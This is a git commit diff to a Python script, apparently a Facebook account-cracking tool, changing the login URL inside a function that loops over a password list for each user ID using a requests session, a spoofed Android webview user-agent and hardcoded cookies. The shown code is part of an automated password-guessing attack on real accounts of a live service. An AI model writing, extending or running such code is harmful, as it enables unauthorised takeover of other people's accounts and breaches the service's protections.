66215fb0e19a17595243bd802b863f4d05afc807
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2025-09-27 14:49:17 +0530

    Update 1.py

--- 1.py
+++ 1.py
@@ -1280,7 +1280,7 @@ def mbasic(uid,pwx,tl):
         for pw in pwx:
             Session = requests.Session()
             head = {"accept": "*/*", "user-agent": "Mozilla/5.0 (Linux; Android 7.1.1; KirinX Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9, en-US,en;q=0.8", "x-requested-with": "XMLHttpCanary", "priority": "u=1, i"} 
-            free_fb = Session.get('https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', headers=head).text
+            free_fb = Session.get('https://touch.facebook.com').text
             cookies = {
             'datr': 'aH3WaNUkO1yuk7Po-ytjAVJc',
             'sb': 'aX3WaDH7hAO44ftEFYsZy6Of',
